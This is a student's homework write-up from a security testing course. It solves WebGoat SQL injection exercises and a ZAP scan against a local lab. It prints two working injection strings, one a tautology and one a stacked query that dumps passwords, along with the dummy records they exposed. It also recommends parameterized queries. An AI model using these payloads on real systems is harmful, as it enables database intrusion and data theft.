# Homework 09: Security Testing

**Author**: Liam Brew

**Date**: 8 November 2020

**Pledge**: I pledge my honor that I have abided by the Stevens Honor System

## Assignment Description

WebGoat is a web application that is full of security holes that can help you to understand security testing techniques.  You'll need to run WebGoat on your machine and then "attack" the system to "steal" information from the WebGoat website running locally on your machine.

## Part I

### SQL Injection

For the SQL Injection challenge, I entered the following string: ```Smith' or '1' = '1```. This formed the complete query seen below and resulted in the following data. As seen, Hershey Jolly's AMEX credit card number is **333300003333**.

```sql
SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
```

```sql
USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT,
101, Joe, Snow, 987654321, VISA, , 0,
101, Joe, Snow, 2234200065411, MC, , 0,
102, John, Smith, 2435600002222, MC, , 0,
102, John, Smith, 4352209902222, AMEX, , 0,
103, Jane, Plane, 123456789, MC, , 0,
103, Jane, Plane, 333498703333, AMEX, , 0,
10312, Jolly, Hershey, 176896789, MC, , 0,
10312, Jolly, Hershey, 333300003333, AMEX, , 0,
10323, Grumpy, youaretheweakestlink, 673834489, MC, , 0,
10323, Grumpy, youaretheweakestlink, 33413003333, AMEX, , 0,
15603, Peter, Sand, 123609789, MC, , 0,
15603, Peter, Sand, 338893453333, AMEX, , 0,
15613, Joesph, Something, 33843453533, AMEX, , 0,
15837, Chaos, Monkey, 32849386533, CM, , 0,
19204, Mr, Goat, 33812953533, VISA, , 0,
```

### Advanced SQL Injection

For the Advanced SQL Injection challenge, I entered the following string: ```smith' or '1' = '1'; SELECT * FROM user_system_data WHERE password = 'dave' or '1' = '```. This completed the below query and resulted in the following data.

```sql
SELECT * FROM user_data WHERE last_name = 'smith' or '1' = '1'; SELECT * FROM user_system_data WHERE password = 'dave' or '1' = '1'
```

```sql
USERID, USER_NAME, PASSWORD, COOKIE,
101, jsnow, passwd1, ,
102, jdoe, passwd2, ,
103, jplane, passwd3, ,
104, jeff, jeff, ,
105, dave, passW0rD, ,
```

As seen above, dave's password is **passW0rD**.

### Explanation

I attacked this 'site' by taking advantage of the developer's failure to properly secure their input design. Due to SQL's syntax, it is possible to format conventional web form inputs so that they are recognized as full-on queries by the backend database. This can be through the use of certain characters such as **'**, **;**, and **-**, allowing the input section to be "broken" and the backend query that drives it to be accessed and modified. This enables potential data leakage, modification and deletion.

I would protect against SQL injections by using parameterized queries. This ensures that the form input and actual database interaction are separated, removing the ability for the users to inject their code. Additionally, input validation can also be used to improve the resiliency of the code in many sectors (both against SQL injections and other attacks as well as against generic information leakage and logic errors). I know many frameworks, such as Java's Spring and .NET's Entity Framework, that offer built-in tools to assist with input validation.

## Part II

The high risk alert that ZAP identified as being present on this website is the risk of an SQL injection. This makes sense, as the whole purpose of the website is to train one's ability in performing and combatting these types of attacks. Here, the SQL injection is possible on the "agree" parameter. This is seen in the screenshot below, followed by more images from by run-through of the attack.

![SQL Injection](https://github.com/Liam-Brew/SSW-567/blob/master/src/Homework/09/sql_injection.png)

![Scan Results](https://github.com/Liam-Brew/SSW-567/blob/master/src/Homework/09/scan_results_1.png)

![Log](https://github.com/Liam-Brew/SSW-567/blob/master/src/Homework/09/log.png)

![Alerts](https://github.com/Liam-Brew/SSW-567/blob/master/src/Homework/09/alerts.png)

## Reflection

I enjoyed this assignment. I am planning to pursue a master's degree here at Stevens in cyber security, so it was nice to be able to get some experience with the basic principles of things that I will be working with. SQL injections seem like a large issue when designing websites and databases, and I can see how care must be taken to protect against them. Luckily for me I will be on the opposite side when it comes to these things. I was previously unfamiliar with the ZAP tool and it seems to be very useful in automatically detecting potential weaknesses and vulnerabilities in websites. I will definitely be sure to use it in the future to assist me in my research.
